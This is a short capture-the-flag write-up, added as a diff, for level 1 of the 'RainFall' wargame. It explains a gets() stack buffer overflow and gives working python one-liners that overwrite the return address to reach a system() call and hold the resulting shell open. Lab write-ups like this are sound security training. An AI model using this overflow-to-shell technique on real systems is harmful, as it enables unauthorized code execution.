@@ -1,0 +1,27 @@
+level 1
+
+we got an executable ./level1 that wait for an input and does nothing
+
+lets debug using gdb fist thing after using info functions we have two function main and run and in main we dont call run function 
+
+main function create a buffer and call gets function to store the input in the buffer we know that gets function over flow the stack so basically if we give an input bigger than the buffer size we will have a segfault
+
+run function call fwrite to print somthing then call system function maybe to execute a shell
+
+so lets try to overflow the stack then overwrite eip register with the adresse of run function
+
+the program segfault after 76 chars
+so the exploit will be somthing like this 
+
+python -c "print('A' * 76 + '\x44\x84\x04\x08')" | ./level1
+
+we got 
+
+level1@RainFall:~$ python -c "print('A' * 76 + '\x44\x84\x04\x08')" | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+
+now we need to stabilize the shell through the pipline after some research on google I got a solution the exploit will somthing like
+
+(python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
+we stabilized the shell now we can print .pass
